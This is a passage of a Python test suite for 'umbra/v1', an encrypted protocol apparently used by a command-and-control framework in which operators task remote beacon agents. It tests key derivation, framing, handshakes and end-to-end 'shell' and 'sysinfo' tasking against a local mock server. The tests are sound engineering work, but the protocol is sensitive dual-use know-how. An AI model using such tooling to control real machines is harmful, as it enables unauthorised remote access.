"""Protocol conformance tests for the Python reference implementation.

They pin the umbra/v1 encoding, key schedule and framing to contracts/vectors.json
(the same file the Go and Rust test-suites read), and exercise the handshake and
framing against a live socket pair.

Run:  python -m pytest tests -q
"""

from __future__ import annotations

import contextlib
import base64
import hashlib
import hmac
import io
import json
import re
import os
import tempfile
import socket
import sys
import threading
import time

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "operator"))

from umbra_cli import crypto, handshake, netio, session, upk, wire  # noqa: E402

VECTORS = json.load(open(os.path.join(ROOT, "contracts", "vectors.json"), encoding="utf-8"))


def b(name: str) -> bytes:
    return bytes.fromhex(name)


# ---------------------------------------------------------------------------
# upk
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("case", VECTORS["upk"], ids=lambda c: c["name"])
def test_upk_encode_matches_vector(case):
    value = _from_json(case["json"])
    assert upk.encode(value).hex() == case["hex"]


@pytest.mark.parametrize("case", VECTORS["upk"], ids=lambda c: c["name"])
def test_upk_decode_roundtrip(case):
    raw = bytes.fromhex(case["hex"])
    decoded = upk.decode_exact(raw)
    assert upk.encode(decoded).hex() == case["hex"]


def _from_json(v):
    if isinstance(v, dict) and set(v) == {"$bin"}:
        return bytes.fromhex(v["$bin"])
    if isinstance(v, dict):
        return {k: _from_json(x) for k, x in v.items()}
    if isinstance(v, list):
        return [_from_json(x) for x in v]
    return v


@pytest.mark.parametrize("name", ["upk_trailing", "upk_unknown_tag", "upk_nonminimal",
                                 "upk_nonminimal_nested", "upk_nonminimal_key_len",
                                 "upk_unsorted_map", "upk_duplicate_key",
                                 "upk_invalid_utf8", "upk_surrogate_utf8", "upk_overlong_utf8",
                                 "upk_depth_exceeded"])
def test_upk_rejects_non_canonical(name):
    with pytest.raises(upk.UpkError):
        upk.decode_exact(bytes.fromhex(VECTORS["rejects"][name]))


def read_text(relative: str) -> str:
    """Read one file of the repository, for the static checks."""
    with open(os.path.join(ROOT, relative), encoding="utf-8") as fh:
        return fh.read()


def wait_until(predicate, timeout: float = 10.0, poll: float = 0.02) -> bool:
    """Wait for a condition instead of sleeping and hoping.

    The suite must not depend on how fast the machine is: a test that
    sleeps a fixed time is a test that is slow on a slow machine and
    flaky on a fast one.  This waits for the thing it wants.
    """
    deadline = time.monotonic() + timeout
    while True:
        if predicate():
            return True
        if time.monotonic() >= deadline:
            return False
        time.sleep(poll)


def wait_for(action, timeout: float = 10.0, poll: float = 0.05):
    """Run an action until it stops raising, and return what it returned."""
    deadline = time.monotonic() + timeout
    while True:
        try:
            return action()
        except Exception:
            if time.monotonic() >= deadline:
                raise
            time.sleep(poll)


def test_upk_map_keys_are_sorted_and_unique():
    encoded = upk.encode({"z": 1, "a": 2, "m": 3})
    decoded = upk.decode_exact(encoded)
    assert list(decoded) == ["a", "m", "z"]
    # canonical: the encoded bytes must be identical in any insertion order
    assert upk.encode({"a": 2, "m": 3, "z": 1}) == encoded


def test_upk_limits():
    with pytest.raises(upk.UpkError):
        upk.encode(b"\x00" * (upk.MAX_STRING + 1))
    # Exactly MAX_DEPTH nested containers is legal, one more is not. The vector
    # file pins the same boundary so every implementation is held to it.
    allowed = "x"
    for _ in range(upk.MAX_DEPTH):
        allowed = [allowed]
    assert upk.decode_exact(upk.encode(allowed)) == allowed

    too_deep = [allowed]
    with pytest.raises(upk.UpkError):
        upk.encode(too_deep)
    for _ in range(upk.MAX_DEPTH + 2):
        too_deep = [too_deep]
    with pytest.raises(upk.UpkError):
        upk.encode(too_deep)


# ---------------------------------------------------------------------------
# key schedule
# ---------------------------------------------------------------------------
def test_hkdf_matches_rfc5869():
    ikm = bytes.fromhex("0b" * 22)
    salt = bytes.fromhex("000102030405060708090a0b0c")
    info = bytes.fromhex("f0f1f2f3f4f5f6f7f8f9")
    okm = crypto.hkdf_sha256(ikm=ikm, salt=salt, info=info, length=42)
    assert okm.hex() == (
        "3cb25f25faacd57a90434f64d0362f2a2d2d0a90cf1a5a4c5db02d56ecc4c5bf34007208d5b887185865"
    )


def test_bootstrap_keys_match_vectors():
    psk = b(VECTORS["psk"])
    suite = VECTORS["bootstrap"]["suite"]
    c2s = crypto.derive_bootstrap_key(psk, "c2s", suite)
    s2c = crypto.derive_bootstrap_key(psk, "s2c", suite)
    assert c2s.hex() == VECTORS["bootstrap"]["c2s_key"]
    assert s2c.hex() == VECTORS["bootstrap"]["s2c_key"]
    assert crypto.bootstrap_nonce_prefix(c2s).hex() == VECTORS["bootstrap"]["c2s_prefix"]
    assert crypto.bootstrap_nonce_prefix(s2c).hex() == VECTORS["bootstrap"]["s2c_prefix"]


def test_directional_keys_differ():
    psk = b(VECTORS["psk"])
    assert crypto.derive_bootstrap_key(psk, "c2s", 1) != crypto.derive_bootstrap_key(psk, "s2c", 1)


def test_session_and_rekey_match_vectors():
    v = VECTORS["session"]
    prk, km = crypto.derive_session(b(v["shared"]), b(v["client_nonce"]), b(v["server_nonce"]))
    assert prk.hex() == v["prk"]
    assert km.c2s_key.hex() == v["c2s_key"]
    assert km.s2c_key.hex() == v["s2c_key"]
    assert km.c2s_prefix.hex() == v["c2s_prefix"]
    assert km.s2c_prefix.hex() == v["s2c_prefix"]

    r = VECTORS["rekey"]
    prk2, km2 = crypto.derive_rekey(prk, b(r["seed"]))
    assert prk2.hex() == r["prk_out"]
    assert km2.c2s_key.hex() == r["c2s_key"]
    assert km2.s2c_prefix.hex() == r["s2c_prefix"]


def test_x25519_agrees_between_peers():
    priv_a, pub_a = crypto.x25519_keypair()
    priv_b, pub_b = crypto.x25519_keypair()
    assert crypto.x25519_shared(priv_a, pub_b) == crypto.x25519_shared(priv_b, pub_a)


def test_handshake_transcripts_match_vectors():
    a = VECTORS["auth"]
    psk = b(VECTORS["psk"])
    hello = crypto.hello_auth(
        psk,
        role=a["role"],
        ident=a["ident"].encode(),
        client_pub=b(a["client_pub"]),
        client_nonce=b(a["client_nonce"]),
        timestamp=a["timestamp"],
        suite=a["suite"],
    )
    assert hello.hex() == a["hello"]
    ack = crypto.ack_auth(
        psk,
        ident=a["ident"].encode(),
        client_pub=b(a["client_pub"]),
        server_pub=b(a["server_pub"]),
        client_nonce=b(a["client_nonce"]),
        server_nonce=b(a["server_nonce"]),
        session_id=b(a["session_id"]),
        suite=a["suite"],
    )
    assert ack.hex() == a["ack"]


# ---------------------------------------------------------------------------
# frames
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("idx", range(len(VECTORS["frames"])))
def test_frame_bytes_match_vectors(idx):
    case = VECTORS["frames"][idx]
    suite = case["suite"]
    nonce = wire.make_nonce(b(case["prefix"]), case["counter"])
    assert nonce.hex() == case["nonce"]
    plain = b(case["plaintext_hex"])
    frame = wire.build_frame(
        suite=suite,
        flags=0,
        msg_type=case["type"],
        key=b(case["key"]),
        nonce=nonce,
        plaintext=plain,
        aead_encrypt=lambda k, n, a, p, s=suite: crypto.aead_encrypt(s, k, n, a, p),
    )
    assert frame.hex() == case["frame_hex"]
    # and the payload must be a valid upk value
    upk.decode_exact(plain)


def test_session_accepts_and_replays_are_rejected():
    v = VECTORS["session"]
    km = crypto.KeyMaterial(
        c2s_key=b(v["c2s_key"]),
        s2c_key=b(v["s2c_key"]),
        c2s_prefix=b(v["c2s_prefix"]),
        s2c_prefix=b(v["s2c_prefix"]),
    )
    srv = session.Session(suite=1, material=km, is_server=True, prk=b(v["prk"]))
    frame = bytes.fromhex(VECTORS["frames"][0]["frame_hex"])
    msg_type, _ = srv.decrypt(frame)
    assert msg_type == wire.MsgType.CHECKIN
    with pytest.raises(session.SessionError):
        srv.decrypt(frame)


def test_tampering_is_detected():
    v = VECTORS["session"]
    km = crypto.KeyMaterial(
        c2s_key=b(v["c2s_key"]),
        s2c_key=b(v["s2c_key"]),
        c2s_prefix=b(v["c2s_prefix"]),
        s2c_prefix=b(v["s2c_prefix"]),
    )
    srv = session.Session(suite=1, material=km, is_server=True, prk=b(v["prk"]))
    for name in ("tampered_tag", "tampered_length", "bad_magic", "truncated"):
        raw = bytes.fromhex(VECTORS["rejects"][name])
        with pytest.raises((session.SessionError, ValueError)):
            srv.decrypt(raw)


def test_concurrent_encrypt_never_reuses_a_nonce():
    """Regression: peek_nonce()+advance() let two threads seal with one nonce.

    A repeated (key, nonce) pair is a total break for GCM, so the reservation
    must be atomic. 32 threads x 64 frames also has to decrypt in order.
    """
    km = crypto.KeyMaterial(
        c2s_key=bytes([3] * 32), s2c_key=bytes([4] * 32),
        c2s_prefix=b"\x00\x00\x00\x03", s2c_prefix=b"\x00\x00\x00\x04",
    )
    cli = session.Session(suite=1, material=km, is_server=False)
    srv = session.Session(suite=1, material=km, is_server=True)

    workers, per_worker = 32, 128
    # Force aggressive GIL hand-offs so the check-then-act window is actually
    # hit; without this the pre-fix code can pass by luck on fast hardware.
    previous_switch = sys.getswitchinterval()
    sys.setswitchinterval(1e-6)
    barrier = threading.Barrier(workers)
    seen = []
    seen_lock = threading.Lock()
    frames = []

    def worker() -> None:
        barrier.wait()
        local = []
        for i in range(per_worker):
            local.append(cli.encrypt(wire.MsgType.PING, {"n": i}))
        with seen_lock:
            frames.extend(local)

    threads = [threading.Thread(target=worker) for _ in range(workers)]
    try:
        for t in threads:
            t.start()
        for t in threads:
            t.join()
    finally:
        sys.setswitchinterval(previous_switch)

    assert len(frames) == workers * per_worker
    nonces = {frame[wire.PRELUDE_LEN:wire.HEADER_LEN] for frame in frames}
    assert len(nonces) == len(frames), "nonce reused under concurrent encrypt"

    # Every frame must still open, and the counters must land exactly in order.
    for frame in sorted(frames, key=lambda f: f[wire.PRELUDE_LEN:wire.HEADER_LEN]):
        msg_type, _ = srv.decrypt(frame)
        assert msg_type == wire.MsgType.PING
    assert cli.send_dir.frames == srv.recv_dir.frames == workers * per_worker


def test_send_gate_serialises_seal_and_write():
    """Deterministic contract test: seal+write is one critical section.

    A stream that deliberately takes 2 ms inside ``send_frame`` makes any
    overlap obvious. Two threads push through one gate; if the gate released the
    lock before writing, both would sit inside ``send_frame`` at once and the
    counters on the wire would come out of order.
    """
    km = crypto.KeyMaterial(
        c2s_key=bytes([8] * 32), s2c_key=bytes([9] * 32),
        c2s_prefix=b"\x00\x00\x00\x08", s2c_prefix=b"\x00\x00\x00\x09",
    )
    cli = session.Session(suite=1, material=km, is_server=False)

    class ProbeStream:
        def __init__(self) -> None:
            self.overlap = False
            self.inside = 0
            self.guard = threading.Lock()
            self.order = []

        def send_frame(self, frame: bytes) -> None:
            with self.guard:
                self.inside += 1
                if self.inside > 1:
                    self.overlap = True
            time.sleep(0.002)  # widen the window on purpose
            self.order.append(int.from_bytes(frame[wire.PRELUDE_LEN:wire.HEADER_LEN][4:], "big"))
            with self.guard:
                self.inside -= 1

    stream = ProbeStream()
    gate = netio.SendGate(cli, stream)
    per_thread = 20

    def worker() -> None:
        for i in range(per_thread):
            gate.send(wire.MsgType.OP_EVENT, {"n": i})

    threads = [threading.Thread(target=worker) for _ in range(2)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert stream.overlap is False, "two writers were inside send_frame at once"
    assert stream.order == list(range(per_thread * 2)), "frames left the gate out of nonce order"


def test_concurrent_senders_keep_nonce_order():
    """Regression: seal-then-write must be one critical section.

    Two threads sharing a connection can seal counters 5 and 6 and then race to
    the socket, delivering 6 first. The peer's strict counter check then kills
    the link, which is exactly how the operator console used to flake.
    """
    km = crypto.KeyMaterial(
        c2s_key=bytes([5] * 32), s2c_key=bytes([6] * 32),
        c2s_prefix=b"\x00\x00\x00\x05", s2c_prefix=b"\x00\x00\x00\x06",
    )
    cli = session.Session(suite=1, material=km, is_server=False)
    srv = session.Session(suite=1, material=km, is_server=True)
    left, right = socket.socketpair()
    writer = netio.Stream(left)
    reader = netio.Stream(right)
    gate = netio.SendGate(cli, writer)

    frames_per_thread = 200
    barrier = threading.Barrier(2)

    def pusher() -> None:
        barrier.wait()
        for i in range(frames_per_thread):
            gate.send(wire.MsgType.OP_EVENT, {"n": i})

    def responder() -> None:
        barrier.wait()
        for i in range(frames_per_thread):
            gate.send(wire.MsgType.OP_RESPONSE, {"n": i})

    previous_switch = sys.getswitchinterval()
    sys.setswitchinterval(1e-6)
    threads = [threading.Thread(target=pusher), threading.Thread(target=responder)]
    try:
        for t in threads:
            t.start()
        # Drain while the writers run, so neither thread blocks on the socket.
        for _ in range(frames_per_thread * 2):
            msg_type, _ = srv.decrypt_message(reader.recv_frame())
            assert msg_type in (wire.MsgType.OP_EVENT, wire.MsgType.OP_RESPONSE)
        for t in threads:
            t.join()
    finally:
        sys.setswitchinterval(previous_switch)
        writer.close()
        reader.close()

    assert srv.recv_dir.frames == frames_per_thread * 2


def test_rekey_keeps_both_sides_in_sync():
    km = crypto.KeyMaterial(
        c2s_key=bytes(32), s2c_key=bytes([1] * 32),
        c2s_prefix=b"\x00\x00\x00\x01", s2c_prefix=b"\x00\x00\x00\x02",
    )
    prk = bytes([7] * 32)
    srv = session.Session(suite=1, material=km, is_server=True, prk=prk)
    cli = session.Session(suite=1, material=km, is_server=False, prk=prk)
    seed = bytes([9] * 32)
    srv.apply_rekey(seed)
    cli.apply_rekey(seed)
    frame = cli.encrypt(wire.MsgType.PING, {"ts": 1})
    msg_type, _ = srv.decrypt(frame)
    assert msg_type == wire.MsgType.PING


# ---------------------------------------------------------------------------
# handshake over a socket pair
# ---------------------------------------------------------------------------
AGENT_PSK = bytes(range(32))
OP_TOKEN = b"operator-token-1234567890"


def _pair_server(results, cfg=None, keyring=None):
    a, b_ = socket.socketpair()

    def serve():
        stream = netio.Stream(a, timeout=5)
        try:
            results["server"] = handshake.server_handshake(
                stream,
                keyring=keyring
                or [
                    handshake.KeyringEntry("agent", AGENT_PSK, crypto.ROLE_AGENT),
                    handshake.KeyringEntry("alice", OP_TOKEN, crypto.ROLE_OPERATOR),
                ],
                cfg=cfg,
            )
            results["stream"] = stream
        except Exception as exc:  # pragma: no cover
            results["error"] = exc

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    return b_, t


def test_handshake_establishes_matching_sessions():
    results = {}
    client_sock, t = _pair_server(results)
    stream = netio.Stream(client_sock, timeout=5)
    result = handshake.client_handshake(
        stream, psk=AGENT_PSK, role=crypto.ROLE_AGENT, ident="agent-1",
        meta={"host": "lab", "os": "linux", "arch": "x86_64", "user": "tester", "pid": 99, "ver": "test"},
    )
    t.join(timeout=5)
    assert "error" not in results, results.get("error")
    srv = results["server"]
    assert srv.peer_id == "agent-1"
    assert srv.session_id == result.session_id
    assert srv.session.suite == result.session.suite

    # The established session keys must interop in both directions.
    stream.send_frame(result.session.encrypt(wire.MsgType.CHECKIN, {"ts": 1, "n": 0}))
    msg_type, body = srv.session.decrypt_message(results["stream"].recv_frame())
    assert msg_type == wire.MsgType.CHECKIN
    assert body["ts"] == 1

    reply = srv.session.encrypt(wire.MsgType.TASK_BATCH, {"tasks": [], "sleep": 5, "jitter": 20, "extra": 0})
    results["stream"].send_frame(reply)
    msg_type, body = result.session.decrypt_message(stream.recv_frame())
    assert msg_type == wire.MsgType.TASK_BATCH
    assert body["sleep"] == 5


def test_handshake_rejects_wrong_psk():
    results = {}
    client_sock, t = _pair_server(results)
    stream = netio.Stream(client_sock, timeout=5)
    with pytest.raises((netio.StreamError, OSError, handshake.HandshakeError)):
        handshake.client_handshake(
            stream, psk=b"\x00" * 32, role=crypto.ROLE_AGENT, ident="agent-1"
        )
    t.join(timeout=5)
    assert "server" not in results


def test_operator_token_is_bound_to_its_identity():
    """An operator must not be able to impersonate another operator's identity."""
    results = {}
    a, b_ = socket.socketpair()

    def serve():
        stream = netio.Stream(a, timeout=5)
        try:
            results["server"] = handshake.server_handshake(
                stream,
                keyring=[
                    handshake.KeyringEntry("agent", AGENT_PSK, crypto.ROLE_AGENT),
                    handshake.KeyringEntry("alice", OP_TOKEN, crypto.ROLE_OPERATOR),
                ],
            )
        except Exception as exc:
            results["error"] = exc

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    stream = netio.Stream(b_, timeout=5)
    with pytest.raises((netio.StreamError, OSError, handshake.HandshakeError)):
        # knows alice's token but claims to be bob
        handshake.client_handshake(stream, psk=OP_TOKEN, role=crypto.ROLE_OPERATOR, ident="bob")
    t.join(timeout=5)
    assert "server" not in results


def test_agent_key_cannot_claim_operator_role():
    results = {}
    a, b_ = socket.socketpair()

    def serve():
        stream = netio.Stream(a, timeout=5)
        try:
            results["server"] = handshake.server_handshake(
                stream,
                keyring=[handshake.KeyringEntry("agent", AGENT_PSK, crypto.ROLE_AGENT)],
            )
        except Exception as exc:
            results["error"] = exc

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    stream = netio.Stream(b_, timeout=5)
    with pytest.raises((netio.StreamError, OSError, handshake.HandshakeError)):
        handshake.client_handshake(stream, psk=AGENT_PSK, role=crypto.ROLE_OPERATOR, ident="agent")
    t.join(timeout=5)
    assert "server" not in results


def test_stale_timestamp_is_rejected():
    results = {}
    client_sock, t = _pair_server(results)
    stream = netio.Stream(client_sock, timeout=5)
    old = int(time.time()) - 10_000
    priv, pub = crypto.x25519_keypair()
    cn = crypto.random_bytes(16)
    auth = crypto.hello_auth(AGENT_PSK, role=crypto.ROLE_AGENT, ident=b"agent-old",
                             client_pub=pub, client_nonce=cn, timestamp=old, suite=1)
    boot = session.Session(
        suite=1,
        material=crypto.KeyMaterial(
            c2s_key=crypto.derive_bootstrap_key(AGENT_PSK, "c2s", 1),
            s2c_key=crypto.derive_bootstrap_key(AGENT_PSK, "s2c", 1),
            c2s_prefix=b"", s2c_prefix=b"",
        ),
        is_server=False, bootstrap=True,
    )
    hello = {"v": 1, "role": crypto.ROLE_AGENT, "id": "agent-old", "pub": pub, "cn": cn,
             "ts": old, "suite": 1, "auth": auth, "meta": {}}
    stream.send_frame(boot.encrypt(wire.MsgType.HELLO, b"\x01" + upk.encode(hello)))
    with pytest.raises((netio.StreamError, OSError)):
        stream.recv_frame()
    t.join(timeout=5)
    assert "server" not in results


# ---------------------------------------------------------------------------
# end-to-end: mock server + reference agent + operator client
# ---------------------------------------------------------------------------
def test_end_to_end_operator_task_execution():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-e2e-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-e2e")
    agent.start()

    from umbra_cli.client import OperatorClient

    events = []
    client = OperatorClient(server.address, token.decode(), "alice", on_event=events.append)
    try:
        client.connect()
        # wait for the agent to register
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        agents = client.agents()
        assert agents and agents[0]["id"] == "agent-e2e"
        assert agents[0]["host"] == "lab-host"

        task_id = client.submit("agent-e2e", "shell", {"cmd": "echo umbra-e2e"})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done"
        assert b"umbra-e2e" in result["out"]

        # sysinfo must round-trip a text report
        info_task = client.submit("agent-e2e", "sysinfo", {})
        info = client.wait_for_result(info_task, timeout=10, poll=0.05)
        assert b"host:" in info["out"]

        # beacon policy updates are visible in the agent record
        client.set_sleep("agent-e2e", 30, 10)
        assert client.agent_info("agent-e2e")["sleep"] == 30

        stats = client.stats()
        assert stats["agents_total"] >= 1
        assert stats["protocol"] == "umbra/v1"

        # the reference agent must have ended a beacon cycle with BYE, which is
        # only possible if both sides agree on the 0x19 message type
        assert agent.sent_bye is True
    finally:
        client.close()
        agent.stop()
        server.stop()

    kinds = {ev.get("kind") for ev in events}
    assert "task.result" in kinds


def test_operator_cli_rejects_bad_token():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    server = MockServer(AGENT_PSK, {"alice": OP_TOKEN})
    server.start()
    try:
        from umbra_cli.client import OperatorClient, OperatorError

        client = OperatorClient(server.address, "wrong-token-xxxxxxxxxxxxxxxx", "alice", timeout=2)
        with pytest.raises((OperatorError, Exception)):
            client.connect()
        client.close()
    finally:
        server.stop()


def test_frame_reader_handles_stream_fragmentation():
    """recv_frame must reassemble frames split across TCP segments."""
    client_sock, server_sock = socket.socketpair()
    payload = os.urandom(5000)
    frame = wire.build_frame(
        suite=1, flags=0, msg_type=wire.MsgType.RESULT,
        key=bytes(32), nonce=bytes(12), plaintext=payload,
        aead_encrypt=lambda k, n, a, p: crypto.aead_encrypt(1, k, n, a, p),
    )

    def dribble():
        for i in range(0, len(frame), 7):
            client_sock.sendall(frame[i : i + 7])
            time.sleep(0.0005)

    t = threading.Thread(target=dribble, daemon=True)
    t.start()
    stream = netio.Stream(server_sock, timeout=5)
    assert stream.recv_frame() == frame


def test_wire_header_validation():
    good = wire.build_frame(
        suite=1, flags=0, msg_type=wire.MsgType.PING, key=bytes(32), nonce=bytes(12),
        plaintext=b"",
        aead_encrypt=lambda k, n, a, p: crypto.aead_encrypt(1, k, n, a, p),
    )
    assert len(good) == wire.HEADER_LEN + wire.TAG_LEN
    frame, off = wire.parse_header(good)
    assert off == wire.HEADER_LEN and frame.length == 0
    with pytest.raises(ValueError):
        wire.parse_header(b"\x55\x43" + b"\x02" + good[3:])
    with pytest.raises(ValueError):
        wire.parse_header(b"XX" + good[2:])


def test_wire_constants_agree_across_implementations():
    """Guards against one language drifting on a message id or limit."""
    import subprocess

    result = subprocess.run(
        [sys.executable, os.path.join(ROOT, "tools", "check_consistency.py")],
        capture_output=True,
        text=True,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    assert "all implementations agree" in result.stdout


def test_server_driven_rekey_keeps_the_cycle_working():
    """REKEY must be sealed with the OLD keys and sent before TASK_BATCH.

    Getting this backwards is silent on the server and fatal on the agent: the
    agent cannot open a frame sealed with a key set it has not switched to yet.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-rekey-0123456789"
    # Rotate on the very first batch: the hardest ordering case, because the
    # agent has no new-key frame behind it to fall back on.
    server = MockServer(AGENT_PSK, {"bob": token}, rekey_after=1)
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-rekey")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "bob")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "agent never registered"

        task_id = client.submit("agent-rekey", "shell", {"cmd": "echo rekeyed"})
        result = client.wait_for_result(task_id, timeout=15, poll=0.05)
        assert result["state"] == "done"
        assert b"rekeyed" in result["out"]
        assert agent.rekeys >= 1, "the server never rotated keys for this session"
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_operator_cli_keeps_stdout_machine_readable():
    """`umbra tasks | jq` must work: banners belong on stderr.

    Also pins the failure path: an unreachable server is one clean line with a
    non-zero exit code, not a traceback (that used to escape from the handshake).
    """
    import subprocess

    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(ROOT, "operator")

    dead = subprocess.run(
        [sys.executable, "-m", "umbra_cli", "--server", "127.0.0.1:4999",
         "-o", "alice", "-k", "deadbeef", "stats"],
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert dead.returncode == 2, dead.stdout + dead.stderr
    assert "connection failed" in dead.stderr
    assert "Traceback" not in dead.stderr

    # Banner goes to stderr, so stdout stays pure even when the link works.
    token = b"operator-token-cli-0123456789"
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    try:
        live = subprocess.run(
            [sys.executable, "-m", "umbra_cli", "--server", server.address,
             "-o", "alice", "-k", token.decode(), "stats"],
            capture_output=True, text=True, env=env, timeout=60,
        )
        assert live.returncode == 0, live.stdout + live.stderr
        assert "connected to" not in live.stdout
        assert "connected to" in live.stderr
        payload = json.loads(live.stdout)
        assert payload["protocol"] == "umbra/v1"
    finally:
        server.stop()


# ---------------------------------------------------------------------------
# Meta-tests: the guards must actually guard.
#
# A checker that silently stops finding problems is worse than no checker, so
# each one is exercised against a deliberately broken copy of the tree.
# ---------------------------------------------------------------------------


def _run_checker(name: str, patch):
    """Run tools/<name> against an in-memory patched view of the sources."""
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        name.replace("-", "_"), os.path.join(ROOT, "tools", name)
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)

    real_read = module.read

    def patched(rel: str) -> str:
        return patch(rel, real_read(rel))

    module.read = patched
    buffer = io.StringIO()
    with contextlib.redirect_stdout(buffer):
        code = module.main()
    return code, buffer.getvalue()


def test_consistency_check_detects_a_constant_drift():
    def drop_kotlin_ps(rel, text):
        # Remove a documented task kind from one implementation only.
        if rel.endswith("TaskRunner.kt"):
            return text.replace('"ps" -> processList()', "")
        return text

    code, out = _run_checker("check_consistency.py", drop_kotlin_ps)
    assert code == 1
    assert "kotlin does not implement" in out


def test_consistency_check_detects_a_missing_rpc():
    def drop_go_rpc(rel, text):
        if rel.endswith(os.path.join("link", "operator.go")):
            return text.replace('case "agents.kill", "agents.exit":', 'case "agents.exit":')
        return text

    code, out = _run_checker("check_consistency.py", drop_go_rpc)
    assert code == 1
    assert "Go server is missing" in out


def test_symbol_check_detects_a_renamed_reference():
    def rename_wire_error(rel, text):
        if rel.endswith(os.path.join("session", "session.go")):
            return text.replace("wire.ErrTooLarge", "wire.ErrFrameTooLarge", 1)
        return text

    code, out = _run_checker("check_symbols.py", rename_wire_error)
    assert code == 1
    assert "ErrFrameTooLarge" in out


def test_symbol_check_is_clean_on_the_real_tree():
    code, out = _run_checker("check_symbols.py", lambda rel, text: text)
    assert code == 0, out


def test_operator_cli_json_mode_is_parseable():
    """--json must emit pure JSON (bytes decoded) on stdout, for scripting."""
    import subprocess

    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-json-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-json")
    agent.start()

    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(ROOT, "operator")
    base = [sys.executable, "-m", "umbra_cli", "--server", server.address,
            "-o", "alice", "-k", token.decode(), "--json"]

    def run(*argv: str) -> "subprocess.CompletedProcess[str]":
        return subprocess.run(base + list(argv), capture_output=True, text=True,
                              env=env, timeout=60)

    try:
        deadline = time.time() + 5
        while time.time() < deadline:
            out = json.loads(run("agents").stdout)
            if out:
                break
            time.sleep(0.05)
        assert out and out[0]["id"] == "agent-json"

        submitted = json.loads(run("run", "agent-json", "--", "echo", "json").stdout)
        task_id = submitted["task_id"]
        assert task_id.startswith("t-")

        result = run("result", task_id)
        payload = json.loads(result.stdout)
        assert payload["state"] in ("queued", "delivered", "done")

        # Wait for completion, then check the output survives as text.
        for _ in range(100):
            payload = json.loads(run("result", task_id).stdout)
            if payload["state"] == "done":
                break
            time.sleep(0.1)
        assert payload["state"] == "done"
        assert "json" in payload["out"]
        assert run("result", task_id).returncode == 0

        # A task that does not exist is a clean, non-zero JSON-ish failure.
        missing = run("result", "t-doesnotexist")
        assert missing.returncode == 1
        assert "error" in missing.stderr
    finally:
        agent.stop()
        server.stop()


def test_consistency_check_detects_a_doc_message_table_drift():
    """The PROTOCOL.md message table is part of the contract too."""
    def renumber_ping(rel, text):
        if rel.endswith("PROTOCOL.md"):
            return text.replace("| `0x14` | PING |", "| `0x13` | PING |")
        return text

    code, out = _run_checker("check_consistency.py", renumber_ping)
    assert code == 1
    assert "PING" in out and "docs say" in out


def test_symbol_check_catches_a_broken_manifest():
    """An XML comment inside a start tag is valid-looking but unparseable."""
    def break_manifest(rel, text):
        if rel.endswith("AndroidManifest.xml"):
            return text.replace(
                '        android:supportsRtl="true"',
                '        android:supportsRtl="true"\n        <!-- note -->',
            )
        return text

    code, out = _run_checker("check_symbols.py", break_manifest)
    assert code == 1
    assert "invalid XML" in out


def test_beacon_error_events_are_rendered_for_operators():
    """The server now surfaces agent ERROR frames; the CLI must print them."""
    import io

    from umbra_cli import cli

    buf = io.StringIO()
    cli.print_event(
        {
            "kind": "beacon.error",
            "agent_id": "agent-1",
            "at": cli.fmt_ts("2026-01-01T00:00:00Z"),
            "data": {"code": 7, "msg": "x" * 200},
        },
        stream=buf,
    )
    line = buf.getvalue().strip()
    assert "beacon.error" in line
    assert "code=7" in line
    # Clip to 60 characters so one noisy frame cannot flood the watch stream.
    assert len(line) < 160


def test_upk_encoder_refuses_non_utf8_strings():
    """Python str may hold lone surrogates; there is no UTF-8 form of them."""
    with pytest.raises(upk.UpkError):
        upk.encode("\ud800")
    with pytest.raises(upk.UpkError):
        upk.encode({"k\udc00": 1})
    # Multi-byte input still round-trips.
    assert upk.decode_exact(upk.encode("çok")) == "çok"


def test_upk_rejects_duplicate_map_keys_explicitly():
    dup = bytes.fromhex(VECTORS["rejects"]["upk_duplicate_key"])
    with pytest.raises(upk.UpkError, match="ascending"):
        upk.decode_exact(dup)
    # A dict cannot hold the same key twice, so the encoder's own duplicate
    # check is defensive; the vector is the case that actually occurs on the
    # wire (two entries claiming the same key must both be read, then refused).
    assert upk.encode({"a": 1}) == bytes.fromhex("09010601610301")


def test_consistency_check_detects_an_unknown_deploy_key():
    """encoding/json ignores unknown keys, so a typo in deploy/ would be silent."""
    def typo_audit_key(rel, text):
        if rel.endswith("server.dev.json"):
            return text.replace('"audit_max_mb"', '"audit_max_size_mb"')
        return text

    code, out = _run_checker("check_consistency.py", typo_audit_key)
    assert code == 1
    assert "unknown key 'audit_max_size_mb'" in out


def test_consistency_check_detects_a_missing_required_deploy_key():
